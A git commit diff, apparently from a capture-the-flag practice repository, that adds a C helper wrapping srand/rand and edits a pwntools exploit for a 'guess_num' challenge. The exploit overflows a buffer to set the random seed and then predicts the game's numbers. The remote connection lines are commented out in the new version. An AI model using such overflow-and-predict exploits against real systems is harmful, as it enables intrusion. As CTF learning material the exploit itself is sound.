1b9a2fe4f23a0c53b63a1f24253d0c41f3bc2c8b
overoptimus <1040570917@qq.com>
2020-04-03 12:01:31 +0800

    更新

---
+++ PWN/123.c
@@ -0,0 +1,10 @@
+#include<stdio.h>
+#include<stdlib.h>
+
+void srand1(){
+  srand(1);
+}
+
+int rand1(){
+  return rand();
+}
--- PWN/guess_num_exp.py
+++ PWN/guess_num_exp.py
@@ -3,18 +3,19 @@ from ctypes import *
 
 elf = ELF('/Users/optimus/CTF/PWN/guess_num')
 # print elf.got
-libc = elf.libc
-libc.srand(1)
+# libc = elf.libc
+# libc.srand(1)
 
-# libc = cdll.LoadLibrary('/Users/optimus/CTF/PWN/libc-2.29.so')
-libc.srand(1)
-payload = 'A' * 0x20 + p64(1)
-r = remote('111.198.29.45', 40400)
-r.recvuntil('name:')
-r.sendline(payload)
+libc = cdll.LoadLibrary('./123.so')
+libc.srand1()
+payload = 'A' * 0x20 + p64(1).decode()
+# r = remote('111.198.29.45', 40400)
+# r.recvuntil('name:')
+# r.sendline(payload)
 for i in range(10):
-    num = str(libc.rand() % 6 + 1)
-    io.recvuntil('number:')
-    io.sendline(num)
+    num = str(libc.rand1() % 6 + 1)
+    print(num)
+    # io.recvuntil('number:')
+    # io.sendline(num)
 
-io.interactive()
+# io.interactive()
